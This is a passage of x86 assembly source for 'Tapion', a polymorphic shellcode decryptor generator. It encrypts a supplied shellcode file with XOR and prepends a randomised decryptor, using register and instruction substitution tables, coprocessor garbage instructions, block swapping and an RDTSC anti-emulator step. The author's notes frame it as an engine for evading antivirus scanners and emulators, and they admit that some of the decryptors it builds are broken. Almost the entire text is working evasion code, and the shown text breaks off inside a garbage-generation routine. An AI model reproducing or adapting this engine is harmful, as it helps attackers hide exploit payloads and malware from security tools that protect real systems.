comment $


			    http://pb.specialised.info
		-------------------------------------------------------
		       TAPION POLYMORPHIC DECRYPTOR GENERATOR
                -------------------------------------------------------
			by Piotr Bania <bania.piotr@gmail.com>



		This is BETA version, due to that some bugs probably 
		exists here... Well 5 days of coding... Have phun.



 Features:
 + decryption key based on generated decryptor
 + decryption based on CPU time (selected randomly)
 + random step of xoring, random step of key increasing
 + random registers usage
 + multiple instruction variants
 + garbage engine (coprocessor instructions/normal garbage)
 + block swapping
 
 Todo:
 + add multiple encryption ways like xor/add/sub. 
 + add more instruction variants
 + fix the bugs
 + i wonder can i handle coding this in C :)

 
 Bugs:
 - some decryptors are not properly build probably due to badly done block
   swapping, should be fixed in newer release, for now just build up a new
   one :)
 - should be fixed in newer version
 
 Notes:
 - The engine was devopled to polymorfize the shellcodes, so it can handle only
   MAX_WORD datas (due of 16 bit registry usage). The decryptor is small so 
   i doubt any emulator will have any problems with scanning it. Appending to
   Dr. Alan Solomon, Vesselin Bontchev and "theirs" system of division of polymorphic 
   viruses into levels according to complexity of code in decryptors, it should be a
   Level 4+? engine (decryptor uses interchangeable instructions and changes their 
   order (instructions mixing), decryption algorithm remains unchanged).

   Well i'm too tired to write the full description, maybe some day. EOT


	
$



include		my_macro.inc
include		io.inc


		@callx	GetCommandLineA
		xchg	esi,eax

parse_c:	lodsb
		test	eax,eax
		jz	show_info
		cmp	al,' '
		je	parse_c1
		jmp	parse_c

parse_c1:	push	esi
		@callx  lstrlenA
		cmp	eax,255
		jge	show_info

		push	esi
		push	offset	file_name
		@callx  lstrcpyA

		mov		eax,offset file_name
		_fopen2 	eax, OF_READ, ebx
		@check  	-1, "Error: cannot open file!"

		_getfilesize 	ebx
		add	eax,4
		
		mov	ecx,eax
		add	ecx,2000		; 2000 bytes for decryptor ??
		mov	dword ptr [mem_size],ecx
		mov	dword ptr [shellcode_size],eax

		push	ecx
		push	PAGE_READWRITE
		push	MEM_COMMIT
		push	ecx
		push	0
		@callx	VirtualAlloc
		@check  0,"Error: cannot allocate enough space"
		mov	dword ptr [mem],eax
		
		push	ebx
		mov	edi,eax
		call	flow_poly
		pop	ebx
		pop	ecx

		mov	edi,dword ptr [mem]

to_end:		cmp	byte ptr [edi],0
		je	end_scan_it
		inc	edi
		jmp	to_end


end_scan_it:	
		mov		dword ptr [where_shell],edi
		push		edi
		_freadREG	ebx,edi,ecx
		@check		0,"Error: cannot read from file"
		pop		edi
		add		edi,eax
		
		call		get_big_num
		mov		[edi],eax
		
		sub		edi,dword ptr [mem]
		mov		dword ptr [all_size],edi
		


		
		_fclose		ebx
	


		; now we need to xor it in exact way like the original decryptor does
goxxx:		
		mov	ecx,dword ptr [where_call_reg]
		add	ecx,2
		sub	cl,byte ptr [was_fldz]		; dec body
		mov	edi,dword ptr [where_shell]	; start of xoring area
		mov	edx,dword ptr [good_size]
		
		;mov	eax,mem_size
		;sub	eax,2000

		mov	eax,dword ptr [compare_byte]
		mov	al,byte ptr [eax]
		mov	ebx,offset here_put
		mov	byte ptr [ebx+2],al
		mov	ebp,ecx

		
		
goforit:
		mov	ebx,[ecx]			; ebx = xor pass
		xor	dword ptr [edi],ebx		; przexoruj ziam

		xor	eax,eax
		mov	al,byte ptr [o_ile1]

		add	edi,eax
		sub	edx,eax

		xor	eax,eax
		mov	al,byte ptr [o_ile2]
		add	ecx,eax


here_put:
		cmp	byte ptr [ecx],0
		jnz	contcont
	
		mov	ecx,ebp


contcont:

		cmp	edx,0
		jl	bad_error

		cmp	edx,0
		jnz	goforit
		jmp	co_work
		
		
;zujzujzuj:
		;int	3
comment	$				
		pseh	<jmp	to_me>
		mov	eax,dword ptr [mem]
		jmp	eax
		rseh	
		jmp	exit

to_me:		rseh
$


co_work:	
		@pushsz	".out"
		push	offset file_name
		@callx	lstrcatA
		

		push	offset file_name
		@callx	DeleteFileA

		mov		eax,offset file_name
		_fcreat2 	eax, ebx
		@check  	-1, "Error: cannot open file!"

		mov	eax,dword ptr [mem]
		mov	ecx,dword ptr [all_size]

		_fwriteREG	ebx,eax,ecx
		_fclose		ebx

	



exit:		push	MEM_DECOMMIT	
		push	dword ptr [mem_size]
		push	dword ptr [mem]
		@callx	VirtualFree

		push 	0
		@callx	ExitProcess


show_info:	@check	0,"Error: Usage tapion.exe <shellcode.bin>"
		jmp	exit

bad_error:	@check	0,"Error: Fatal error occurred - restart the engine!"


all_size	dd	0
good_size	dd	0
where_shell	dd	0
mem_size	dd	0
mem		dd	0
file_name	db	512	dup (0)
test		db	5500h 	dup (0)
test2		db	40 	dup (0)




shellcode:	db	123h	dup	(90h)
shellcode_size	dd	($-offset shellcode)




; -----------------------------------------------------------------------------
; MAKES THE DECRYPTOR
; -----------------------------------------------------------------------------


flow_poly:
				
		mov	ebx,1
		call	random_setup
		call	gen_regs

		mov	dword ptr [clear_ptr],edi
		;;	now we are calculating step for xoring but beware the 
		;; 	cases when loop(reg-step) will not reach the zero
		;;	in exact way, we will have a infinite loop there

		mov	eax,3
		call	random_eax
		inc	eax
		mov	byte ptr [o_ile1],al		; step for xoring
		
	
		movzx	ecx,al
		mov	eax,dword ptr [shellcode_size]


test_it:	mov	edx,dword ptr [shellcode_size]
		xor	eax,eax
		mov	al,byte ptr [o_ile1]
		
test_itx:	sub	edx,eax
		cmp	edx,0
		jz	test_it_good		
		cmp	edx,0
		jl	test_it_bad
		jmp	test_itx


test_it_bad:	neg	edx
		add	dword ptr [shellcode_size],edx
		jmp	test_it



test_it_good:
		
		mov	eax,dword ptr [shellcode_size]
		mov	dword ptr [good_size],eax

		xor	edx,edx
		xor	esi,esi

		cmp	byte ptr [block1_reg],M0_EAX
		je	normal_stage2
		cmp	byte ptr [block1_reg],M0_EDX
		je	normal_stage2
		cmp	byte ptr [block3_reg],M0_EDX
		je	normal_stage2
		cmp	byte ptr [block3_reg],M0_EAX
		je	normal_stage2


		mov	dword ptr [where_block3],edi
		mov	eax,2
		call	random_eax			; with RDTSC ??
		test	eax,eax
		jz	normal_stage2

		;;	place anti emulator code

		mov	edx,1				; edx = 1 place RDTSC

normal_stage2:
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	normal_stage
		
		mov	esi,1				; eip was placed on first place
		cmp	edx,1
		jne	@@g_w1
		mov	dword ptr [where_block3],edi
		call	gen_anti_emul
		jmp	normal_stage

@@g_w1:		mov	dword ptr [where_block3],edi
		call	gen_getEIP
		

normal_stage:
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	with_first_block

		mov	byte ptr [block2_option],1
		jmp	skip_first_block

with_first_block:
		mov	dword ptr [where_block1],edi
		call	gen_zero_reg

skip_first_block:
		call	gen_movS_reg


normal_getEIP:	cmp	esi,1				; eip was already placed
		je	skip_getEIP

		mov	dword ptr [where_block3],edi

		cmp	edx,1				; place rdtsc ??
		jne	@@g_w2
		call	gen_anti_emul			; place RDTSC
		jmp	skip_getEIP

@@g_w2:		mov	dword ptr [where_block3],edi
		call	gen_getEIP

		
skip_getEIP:
		mov	edx,edi
		mov	dword ptr [shellcode_size],55h
		mov	byte ptr [save_rndX],1
		mov	dword ptr [where_block4],edi
		call	gen_zero_counter
		mov	byte ptr [save_rndX],0

		mov	dword ptr [where_block5],edi		
		call	gen_copy_reg
		mov	dword ptr [where_loop],edi

		mov	dword ptr [where_block6],edi
		call	gen_mov_regD
		mov	dword ptr [where_block7],edi
		call	gen_xor_regs
		mov	dword ptr [where_block8],edi
		call	gen_add_regs
		call	gen_cmp_crypt
		mov	dword ptr [where_block9],edi
		call	gen_compare


		call	place_it


		

		mov	byte ptr [stage2],1
		mov	byte ptr [save_rndX],2
		mov	edi,edx
		call	gen_zero_counter
		
		push	edi
		lea	edi,test2
		call	swap_blocks
		pop	edi

give_next_byte:		
		; now fill the byte for the cmp instruction
		mov 	eax,dword ptr [where_block8]
		mov 	ecx,dword ptr [where_block3]
		sub	eax,ecx
		
				; size from block3 to block9 (-3)

		
		cmp	byte ptr [o_ile2],0
		jne	go_byte
		call	get_big_num
		jmp	byte_ok2
			

go_byte:
		movzx	ebx,byte ptr [was_fldz]
		mov	edx,dword ptr [where_call_reg]
		sub	edx,ebx
		add	edx,2


		; EAX = size of area
		; EDX = start of search


		
		movzx	ebx,byte ptr [o_ile2]
		mov	ecx,eax		

	
		add	edx,ebx
		sub	ecx,ebx


check_byte:	mov	eax,2
		call	random_eax
		test	eax,eax
		jz	byte_ok

		add	edx,ebx
		sub	ecx,ebx
		cmp	ecx,0
		jg	check_byte
		jmp	give_next_byte

byte_ok:	
		mov	al,byte ptr [edx]
byte_ok2:	mov	edx,dword ptr [compare_byte]
		mov	byte ptr [edx],al
		dec	edx
		
		ret


place_it:	pushad
		mov	esi,dword ptr [clear_ptr]


till_zero:	cmp	word ptr [esi],0
		je	found_end_buff
		inc	esi
		jmp	till_zero
		

found_end_buff:
		sub	esi,dword ptr [where_call_reg]
		sub	esi,2
		movzx	ebx,byte ptr [was_fldz]
		add	esi,ebx
		
		mov	dword ptr [shellcode_size],esi

		popad
		ret






clear_ptr	dd	0





; --------------------------------------------------------------------------
; INSTRUCTION TABLE:
; --------------------------------------------------------------------------
; OPCODE  MODRM  FLAG  SIZE
; 

V_POSITIVE		equ	1
V_NEGATIVE		equ	0

END_TR			equ	255
NO_M			equ	02dh
C_NONE			equ	0
C_SRC			equ	1
C_DST			equ	2
C_BOTH			equ	3


i_table:

xor_reg_reg		db	033h,  0c0h, C_BOTH, 2		; xor reg,reg
mov_reg_num		db	0c7h,  0c0h, C_SRC,  6		; mov reg,NUM
push_num		db	068h,  NO_M, C_NONE, 5		; push NUM
pop_reg			db	058h,  NO_M, C_SRC,  1		; pop reg
add_reg_num		db	081h,  0c0h, C_SRC,  6		; add reg,NUM
sub_reg_num		db	081h,  0e8h, C_SRC,  6		; sub reg,NUM
neg_reg			db	0f7h,  0d8h, C_SRC,  2		; neg reg
bswap_reg		db	00fh,  0c8h, C_SRC,  2		; bswap reg (don't look at modrm...)
xor_reg_num		db	081h,  0f0h, C_SRC,  6		; xor reg,NUM
sub_reg_reg		db	02bh,  0c0h, C_BOTH, 2		; sub reg,reg
inc_reg			db	040h,  NO_M, C_SRC,  1		; inc reg
mov_reg16_num		db	0c7h,  0c0h, C_SRC,  4		; mov reg_16, NUM (requires prefix: 66h / s:5)
bswap_reg16		db	00fh,  0c8h, C_SRC,  2		; bswap reg_16 (requires preifx: 66h / s: 3)
sub_reg16_num		db	081h,  0e8h, C_SRC,  4		; sub reg_16, NUM (requires prefix: 66h / s:5)
add_reg16_num		db	081h,  0c0h, C_SRC,  4		; add reg_16, NUM (requires prefix: 66h / s:5)
dec_reg16		db	048h,  NO_M, C_SRC,  1		; inc reg_16 (requires prefix: 66h / s:2)
neg_reg16		db	0f7h,  0d8h, C_SRC,  2		; neg reg_16 (requires prefix: 66h / s:2)
xor_reg16		db	081h,  0f0h, C_SRC,  4		; xor reg_16 (requires prefix: 66h / s: 5)
inc_reg16		db	040h,  NO_M, C_SRC,  1		; inc reg_16 (requires prefix: 66h / s:2)
mov_reg_esp		db	08bh,  0c4h, C_DST,  2		; mov reg,esp
push_reg		db	050h,  NO_M, C_SRC,  1		; push reg
call_reg		db	0ffh,  0d0h, C_SRC,  2		; call reg
mov_reg_eax		db	08bh,  0d8h, C_DST,  2		; mov reg,eax	
sub_eax_reg		db	02bh,  0c3h, C_SRC,  2		; sub eax,reg
add_reg_eax		db	003h,  0d8h, C_DST,  2	        ; add reg,eax
mov_reg_reg		db	08bh,  0d8h, C_BOTH, 2		; mov reg,reg
add_reg_reg		db	003h,  0d8h, C_BOTH, 2		; add reg,reg
mov_reg_regD		db	08bh,  003h, C_BOTH, 2		; mov reg,[reg]
push_regD		db	0ffh,  030h, C_SRC,  2		; push [reg]
add_reg_regD		db	003h,  003h, C_BOTH, 2		; add reg,[reg]
xor_dword_2reg		db	031h,  014h, C_DST,  2		; xor [reg1+reg2],reg3 -> requires SIB!!!	
dec_reg			db	048h,  NO_M, C_SRC,  1		; dec reg
jump_jnz		db	075h,  NO_M, C_NONE, 2		; jnz loc
test_reg_reg		db	085h,  0c0h, C_BOTH, 2		; test reg,reg
or_reg_reg		db	009h,  0c0h, C_BOTH, 2 		; or reg,reg
i_nop			db	090h,  NO_M, C_NONE, 1		; nop
i_cmp_reg_reg		db	03bh,  0c3h, C_BOTH, 2		; cmp reg,reg
i_cmp_reg_num		db	081h,  0f8h, C_SRC,  6		; cmp reg,NUM
i_cmc			db	0f5h,  NO_M, C_NONE, 1		; cmc
i_stc			db	0f9h,  NO_M, C_NONE, 1		; stc
i_std			db	0fdh,  NO_M, C_NONE, 1		; std
i_cld			db	0fch,  NO_M, C_NONE, 1		; cld
jump_jl			db	07ch,  NO_M, C_NONE, 2
cmp_byte_reg_num	db	080h,  03fh, C_SRC,  3		; cmp byte ptr [reg],NUM
jump_jne		db	075h,  NO_M, C_NONE, 2		; jne loc


p_xor_reg_reg		equ	0
p_mov_reg_num		equ	1
p_push_num		equ	2
p_pop_reg		equ	3
p_add_reg_num		equ	4
p_sub_reg_num		equ	5
p_neg_reg		equ	6
p_bswap_reg		equ	7
p_xor_reg_num		equ	8
p_sub_reg_reg		equ	9
p_inc_reg		equ	10
p_mov_reg16_num		equ	11
p_bswap_reg16		equ	12
p_sub_reg16_num		equ	13
p_add_reg16_num		equ	14
p_dec_reg16		equ	15
p_neg_reg16		equ	16
p_xor_reg16_num		equ	17
p_inc_reg16		equ	18
p_mov_reg_esp		equ	19
p_push_reg		equ	20
p_call_reg		equ	21
p_mov_reg_eax		equ	22
p_sub_eax_reg		equ	23
p_add_reg_eax		equ	24
p_mov_reg_reg		equ	25
p_add_reg_reg		equ	26
p_mov_reg_regD		equ	27
p_push_regD		equ	28
p_add_regD		equ	29
p_xor_dword_2reg	equ	30
p_dec_reg		equ	31
p_jump_jnz		equ	32
p_test_reg_reg		equ	33
p_or_reg_reg		equ	34
p_nop			equ	35
p_cmp_reg_reg		equ	36
p_cmp_reg_num		equ	37
p_cmc			equ	38
p_stc			equ	39
p_std			equ	40
p_cld			equ	41
p_jump_jl		equ	42
p_cmp_byte_reg_num	equ	43
p_jne			equ	44


M0_EAX			equ	0
M0_ECX			equ	1
M0_EDX			equ	2
M0_EBX			equ	3
M0_ESI			equ	4
M0_EDI			equ	5
M1_EAX			equ	0
M1_ECX			equ	1
M1_EDX			equ	2
M1_EBX			equ	3
M1_ESI			equ	6
M1_EDI			equ	7
M2_EAX			equ	0 shl 3
M2_ECX			equ	1 shl 3
M2_EDX			equ	2 shl 3
M2_EBX			equ	3 shl 3
M2_ESI			equ	6 shl 3
M2_EDI			equ	7 shl 3

x1_table:		db	M1_EAX
			db	M1_ECX
			db	M1_EDX
			db	M1_EBX
			db	M1_ESI
			db	M1_EDI
x1_tbl_size		=	$ - offset x1_table

x2_table:		db	M2_EAX
			db	M2_ECX
			db	M2_EDX
			db	M2_EBX
			db	M2_ESI
			db	M2_EDI
x2_tbl_size		=	$ - offset x2_table


allowed_regs:		db	M0_EAX, M0_ECX, M0_EDX, M0_EBX, M0_ESI, M0_EDI	; source
allowed_regs_d:		db	M0_EAX, M0_ECX, M0_EDX, M0_EBX, M0_ESI, M0_EDI  ; dest

allowed_regs_mirror:	db	M0_EAX, M0_ECX, M0_EDX, M0_EBX, M0_ESI, M0_EDI


current_map		dd	0
current_map_index	db	0

map_block1		db	120	dup (0)			; xor reg,reg block
map_block2		db	120	dup (0)			; mov reg,shellcode_size
map_block3		db	120	dup (0)			; geteip code
map_block4		db	120	dup (0)			; copy reg-eip value
map_block5		db	120	dup (0)			; mov reg5,[reg4(reg_eip_copy)]
map_block6		db	120	dup (0)			; inits the counter reg
map_block7		db	120	dup (0)			; xor [reg1+reg2],reg3
map_block8		db	120	dup (0)			; add regs++
map_block9		db	120	dup (0)			; compare instructions
map_block10		db	120	dup (0)


where_block1		dd	0
where_block2		dd	0
where_block3		dd	0
where_block4		dd	0
where_block5		dd	0
where_block6		dd	0
where_block7		dd	0
where_block8		dd	0
where_block9		dd	0




antiemul_map		db	120	dup (0)
where_call_reg		dd	0
where_loop		dd	0
o_ile1			db	0				; counter increaser
o_ile2			db	0				; decryptor body increaser
last_block_size		db	0
stage2			db	0
stage_rnd		db	0
stage_rndX		db	0
save_rndX		db	0
was_fldz		db	0				; if so +7 extra bytes


block2_option		db	0				; no xoring block at first



			; coprocessor initialization

copro_init:		fwait
        		fninit
copro_init_size		equ	$-offset copro_init

			; 2 byte coprocessor instructions
copro_2byte_garbage:	
			f2xm1 
			fabs
			fadd
			faddp
			fchs
			fnclex
			fcom
			fcomp
			fcompp
			fcos
			fdecstp
			fdiv
			fdivp
			fdivr
			fdivrp
			ffree
			fincstp
			fld1
			fldl2t
			fldl2e
			fldpi
			fldln2
			fmul
			fmulp
			fnclex
			fnop
			fpatan
			fprem
			fprem1
			fptan
			frndint
			fscale
			fsin
			fsincos
			fsqrt
			fst
			fstp
			fsub
			fsubp
			fsubr
			fsubrp
			ftst
			fucom
			fucomp
			fucompp
			fxam
			fxtract
			fyl2x
			fyl2xp1
copro_2byte_garbage_size = (($-offset copro_2byte_garbage)/2)


normal_garbage_vtbl:	db	p_cmp_reg_reg
			db	END_TR
		
			db	p_test_reg_reg
			db	END_TR
		
			db	p_cmp_reg_num
			db	END_TR
	
			db	p_nop
			db	END_TR

			db	p_cmc
			db	END_TR

			db	p_stc
			db	END_TR

			db	p_std
			db	END_TR

			db	p_cld
			db	END_TR

normal_garbage__variants_size equ 6





; ---------------------------------------------------------------------
; poly-replacement table for mov reg2,[reg1]
; ---------------------------------------------------------------------

give_movREGd_vtbl:
			;;	variant 0
			db	p_mov_reg_regD			; give: mov reg2,[reg1]
			db	END_TR

			;;	variant 1
			db	p_push_regD			; give: push [reg1]
			db	p_pop_reg			;       pop reg2
			db	END_TR

			;;	variant 2			
								; give: xor reg2,reg2
			db	p_add_regD			;       add reg2,[reg1]
			db	END_TR


give_movREGd_variants_size equ 2
			



; ---------------------------------------------------------------------
; poly-replacement table for cmp reg, 0
; ---------------------------------------------------------------------

give_cmpREG_vtbl:	;;	variant 0
			;db	p_jump_jnz			; give: jnz loop
			;db	END_TR

			;;	variant 1
			db	p_test_reg_reg			; give: test reg,reg
			db	p_jump_jnz			;       jnz  loop
			db	END_TR

			;;	variant 2
			db	p_or_reg_reg			; give: or  reg,reg
			db	p_jump_jnz			;       jnz loop
			db	END_TR

give_cmpREG_variants_size equ 1

; ---------------------------------------------------------------------
; poly-replacement table for mov reg2,reg1
; ---------------------------------------------------------------------

give_movREG_vtbl:
			;;	variant 0
			db	p_mov_reg_reg			; give: mov reg2,reg1
			db	END_TR

			;;	variant 1
			db	p_push_reg			; give: push reg1
			db	p_pop_reg			;       pop  reg2
			db	END_TR

			;;	variant 2
								; give: xor reg2,reg2 REP
			db	p_add_reg_reg			;       add reg2,reg1
			db	END_TR		

give_movREG_variants_size equ 2


; ---------------------------------------------------------------------
; poly-replacement table for GetEIP block
; ---------------------------------------------------------------------

give_getEIP_vtbl:
			;;	variant 0
								; give: fldz
								;       fnstenv	[esp-12]
			db	p_pop_reg			;       pop reg
			db	END_TR

			;;	Variant 1
			db	p_push_num			; give: push INSTR
			db	p_mov_reg_esp			;       mov  reg,esp
			db	p_call_reg			;       call reg
			db	END_TR

			;;	Variant 2
			db	p_mov_reg_num			; give: mov reg,INSTR
			db	p_push_reg			;       push reg
			db	p_mov_reg_esp			;       mov reg,esp
			db	p_call_reg			;       call reg
			db	END_TR

			;;	Variant 3
			db	p_push_num			; give: push INSTR
								;       lea  reg,esp
			db	p_call_reg			;       call reg
			db	END_TR

			;;	variant 4
			db	p_mov_reg_num			; give: mov reg,INSTR
			db	p_push_reg			;       push reg
								;       lea reg,[esp]
			db	p_call_reg			;       call reg
			db	END_TR

give_getEIP_variants_size equ     4


; ---------------------------------------------------------------------
; poly-replacement table for "xor reg,reg" instruction
; ---------------------------------------------------------------------

give_zero_reg_vtbl:		
			;; 	Variant 0
			db	p_xor_reg_reg			; give 	xor reg,reg
			db	END_TR

			;;	Variant 1
			db	p_push_num			; give: push BIG_NUM
			db	p_pop_reg			; 	pop  reg
			db	p_sub_reg_num			;	sub  reg,BIG_NUM
			db	END_TR
						
			;;	Variant 2 (EXECEPT->NEG)
			db	p_push_num			; give:	push BIG_NUM(NEGATIVE)
			db	p_pop_reg			;	pop  reg
			db	p_add_reg_num			;	add  reg,BIG_NUM(POSITIVE)
			db	END_TR

			;;	Variant 3 (EXCEPT->SNDNUM)
			db	p_mov_reg_num			; give:	mov  reg,BIG_NUM
			db	p_add_reg_num			;	add  reg,SOME_NUM(POSITIVE)			
			db	p_sub_reg_num			;	sub  reg,BIG_NUM+SOME_NUM
			db	END_TR	

			;;	Variant 4 (EXCEPT->NEG)
			db	p_mov_reg_num			; give:	mov  reg,BIG_NUM
			db	p_add_reg_num			;	add  reg,SOME_NUM(NEGATIVE)
			db	p_add_reg_num			;	add  reg,SOME_NUM(POSITIVE)
			db	END_TR
			
			;;	Variant 5 (EXCEPT->SNDNUM)
			db	p_mov_reg_num			; give:	mov  reg,BIG_NUM
			db	p_sub_reg_num			;	sub  reg,BIG_NUM - 3
			db	p_inc_reg			;	inc  reg
			db	p_inc_reg			;	inc  reg
			db	p_inc_reg			;	inc  reg
			db	END_TR	

			;;	Variant 6 (EXCEPT->3NUM)
			db	p_mov_reg_num			; give:	mov  reg,BIG_NUM(P)
			db	p_xor_reg_num			;       xor  reg,SOME_NUM(P)
			db	p_sub_reg_num			;	sub  reg,NUM_AFTER_XORING(P)
			db	END_TR

			;;	Variant 7	
			db	p_sub_reg_reg			; give: sub  reg,reg
			db	END_TR		
						
			;;	Variant 8
			db	p_mov_reg_num			; give:	mov  reg,BIG_NUM(P)
			db	p_neg_reg			; 	neg  reg
			db	p_add_reg_num			;	add  reg,BIG_NUM(P)
			db	END_TR					

			;;	Variant 9 (EXCEPT->SNDNUM)
			db	p_mov_reg_num			; give:	mov   reg,BIG_NUM(P)
			db	p_bswap_reg			;	bswap reg
			db	p_sub_reg_num			;	sub   reg,BIG_NUM_SWAPPED
			db	END_TR

give_zero_regs_variants	equ	9



; ---------------------------------------------------------------------
; poly-replacement table for "mov reg_16b,data_size" instruction
; ---------------------------------------------------------------------

give_movS_reg_vtbl:

			;;	Variant 0
			db	p_mov_reg16_num			; give: mov   reg_16,s_size
			db	END_TR

			;;	Variant 1
			db	p_mov_reg16_num			; give: mov   reg_16,s_size - 1
			db	p_inc_reg16			;       inc   reg_16
			db	END_TR

			;;	Variant 2
			db	p_mov_reg16_num			; give: mov   reg_16,s_size - SOME_NUM
			db	p_add_reg16_num			;       add   reg_16,SOME_NUM
			db	END_TR

			;;	Variant 3
			db	p_mov_reg16_num			; give: mov   reg_16,s_size + SOME_NUM
			db	p_sub_reg16_num			;       sub   reg_16,SOME_NUM
			db	END_TR

			;;	Variant 4
			db	p_mov_reg16_num			; give: mov   reg_16,s_size xor SOME_NUM
			db	p_xor_reg16_num			;       xor   reg_16,SOME_NUM
			db	END_TR

			;;	Variant 5
			db	p_mov_reg16_num			; give: mov   reg_16,s_size + 2
			db	p_dec_reg16			;       dec   reg_16
			db	p_dec_reg16			;       dec   reg_16
			db	END_TR

			;;	Variant 6
			db	p_mov_reg16_num			; give: mov   reg_16,negative s_size
			db	p_neg_reg16			;       neg   reg_16
			db	END_TR

			;;	Variant 7
			db	p_mov_reg_num			; give: mov   reg_32,s_size + SOME_NUM
			db	p_sub_reg_num			;       sub   reg_32,SOME_NUM
			db	END_TR

			;;	Variant 8
			db	p_push_num			; give: push  s_size + SOME_NUM
			db	p_pop_reg			;       pop   reg_32
			db	p_sub_reg_num			;	sub   reg_32,SOME_NUM
			db	END_TR

			;;	Variant 9
			db	p_mov_reg_num			; give: mov   reg_32,swapped: s_size + SOME_NUM
			db      p_bswap_reg			;	bswap reg_32
			db	p_sub_reg_num			;	sub   reg_32,SOME_NUM
			db	END_TR


give_movS_regs_variants equ	9			
			
			
			

; ---------------------------------------------------------------------
; generates specyfic instruction 
; ---------------------------------------------------------------------
; Entry: 	EDI = out buffor
;		ESI = ptr to instruction to mutate
;		EBX = instruction operand (if it is equal to -1, random number is generated)
;	(VAR)   i_operand = insturction operand
;
; Out:		EBX = random number of needed
;		EAX = size of generated instruction


i_operand	dd	0

gen_instruction:	
		pushad
		lodsw					; ah = modrm value / al=opcode

		cmp	ah,NO_M
		je	no_modrm

		stosb					; store opcode
		xor	edx,edx
		mov	dl,ah
		cmp	byte ptr [esi],C_BOTH		; what registers to mutate
		je	p_01
		cmp	byte ptr [esi],C_SRC
		jne	t_01

p_01:		and	dl,0F8h		
		mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		or	dl,al
		mov	byte ptr [edi],dl

t_01:		cmp	byte ptr [esi],C_BOTH		; what registers to mutate
		je	p_02
		cmp	byte ptr [esi],C_DST
		jne	finish_i

p_02:		and	dl,0C7h	
		mov	eax,x2_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs_d[eax]]
		mov	al,byte ptr [x2_table[eax]]
		or	dl,al				; update modrm value
		mov	byte ptr [edi],dl

finish_i:	mov	cl,byte ptr [esi+1]
		sub	cl,2
		inc	edi
finish_i_no:	
		cmp	cl,0
		jle	garbage_done

		cmp	ebx,-1
		jne	got_op

store_op:	mov	eax,12345678h			; store operand
		call	random_eax
		stosb				
		loop	store_op
		jmp	garbage_done

got_op:		push	esi
		push	eax
		xor	eax,eax
		mov	al,cl
		xor	ecx,ecx
		mov	cl,al
		lea	esi,i_operand
		rep	movsb
		pop	eax
		pop	esi
		
		
garbage_done:	
		xor	eax,eax
		mov	al,byte ptr [esi+1]


gen_i_exit:	mov	[esp+PUSHA_STRUCT._EAX],eax
		mov	[esp.PUSHA_STRUCT._EBX],ebx
		mov	edi,[esp+PUSHA_STRUCT._EDI]
		add	edi,eax
		
		cmp	byte ptr [no_garbage],1
		je	leave_gar
		call	garbage_fly
leave_gar:
		mov	[esp+PUSHA_STRUCT._EDI],edi

		mov	ebx,dword ptr [current_map]
		movzx	ecx,byte ptr [current_map_index]

		mov	byte ptr [ebx+ecx],al
		inc	byte ptr [current_map_index]


		popad
		ret

no_modrm:	xor	edx,edx
		mov	dl,al

		mov	cl,byte ptr [esi+1]
		dec	cl

		cmp	byte ptr [esi],C_NONE
		je	t_none


go_nomodrm:	mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		and	dl,0F8h
		or	dl,al
		mov	byte ptr [edi],dl
		inc	edi
		jmp	finish_i_no
									
			
t_none:		mov	byte ptr [edi],dl
		inc	edi
		jmp	finish_i_no



inc_map:	pushad
		mov	ebx,dword ptr [current_map]
		movzx	ecx,byte ptr [current_map_index]
		inc	byte ptr [ebx+ecx]
		popad
		ret

; AL = size of insutrction
add_map:	pushad
		mov	ebx,dword ptr [current_map]
		movzx	ecx,byte ptr [current_map_index]
		mov	byte ptr [ebx+ecx],al
		inc	byte ptr [current_map_index]
		popad
		ret



; ---------------------------------------------------------------------
; block swapper
; --------------------------------------------------------------------- 


swap_blocks:
		pushad

		;;	4 and 5 block can be mixed each other 

		mov	eax,2
		call	random_eax
		test	eax,eax
		jnz	swap_blocks_noMIX1		; this time we will not mix it

		xor	eax,eax
		mov	ebx,dword ptr [where_block5]	; block5 (get eip)
		mov	edx,dword ptr [where_block4]	; first block		
		mov	ecx,dword ptr [where_block6]
		sub	ecx,ebx				; ecx = size of block5

		add	eax,ecx
		mov	esi,ebx				; copy block5 firstly
		rep	movsb
		mov	ecx,ebx
		sub	ecx,edx				; ecx = size of 4 block
		add	eax,ecx
		mov	esi,edx
		rep	movsb				; append first block
		
		mov     ecx,eax
		sub	edi,ecx
		mov	esi,edi
		mov	edi,dword ptr [where_block4]
		rep	movsb


swap_blocks_noMIX1:		

		;;	now should we mix some of incs together? just to make it more randomized

		cmp	byte ptr [mut2_byte],0
		je	swap_blocks_end

		mov	eax,2
		call	random_eax
		test	eax,eax
		jnz	swap_blocks_end		; this time not
		

		mov	edi,dword ptr [where_block8]	; inc regs block
		mov	ecx,dword ptr [where_block9]
		sub	ecx,edi				; ecx = sizeof inc regs block
		mov	esi,edi

		mov	ebx,esi
		mov	edx,ecx

		
scan_for_byte:  mov    	eax,2
		call   	random_eax
		mov	eax,0
		test	eax,eax
		jz	leave_this_byte

		lodsb
		cmp	al,byte ptr [mut1_byte]				
		jne	leave_this_byte

		; now we found a byte which we potencial can replace time to scan the
		; memory for second byte and make a swap

		push	ebx
		push	edx

scan2:		mov	al,byte ptr [ebx]
		cmp	al,byte ptr [mut2_byte]
		jne	scan_cont		
		
		; the byte was found now we will replace them
		mov	edi,esi
		dec	edi

		stosb	; stos the second byte on the first one
		mov	al,byte ptr [mut1_byte]
		mov	byte ptr [ebx],al
		pop	edx
		pop	ebx
		jmp	swap_blocks_end		

scan_cont:	inc	ebx
		dec	edx
		jnz	scan2

		pop	edx
		pop	ebx		

		
leave_this_byte:
		loop	scan_for_byte








swap_blocks_end:	
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret


mut1_byte	db	0
mut2_byte	db	0


; ---------------------------------------------------------------------
; copro garbage routines
; --------------------------------------------------------------------- 

copro_garbage_init:
		pushad

		mov	byte ptr [copro_init_flag],1

		mov	ecx,copro_init_size
		push	ecx
		lea	esi,copro_init
		rep	movsb
		pop	eax

		mov	al,cl
		call	add_map

		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

garbage_start	dd		0
copro_init_flag	db 		0
no_garbage	db		0
do_normal	db		0


garbage_fly:
		pushad


